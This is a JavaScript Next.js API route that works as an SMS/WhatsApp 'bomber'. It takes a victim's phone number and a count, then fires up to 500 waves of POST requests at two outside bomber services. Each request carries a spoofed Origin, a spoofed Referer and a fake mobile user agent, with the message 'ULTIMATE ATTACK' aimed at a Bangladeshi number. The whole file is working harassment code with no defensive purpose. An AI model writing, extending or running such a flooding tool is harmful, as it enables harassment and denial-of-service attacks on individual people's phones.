// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target Links - Ekhane amra direct endpoint hit korbo
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/api/send', 
    'https://nuke-sms-bomber.pages.dev/api/attack'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra ekhane ekta fake user agent ebong headers use korbo
      const attackPromises = targetLinks.map(link => 
        fetch(link, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://shadowx-sms-bomber.onrender.com', // Spoofing Origin
            'Referer': 'https://shadowx-sms-bomber.onrender.com/', // Spoofing Referer
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
          },
          body: JSON.stringify({
            number: number,
            amount: 1,
            country: "BD",
            service: "whatsapp",
            msg: "ULTIMATE ATTACK"
          }),
        }).catch(err => console.log("Wave Error:", err.message))
      );

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
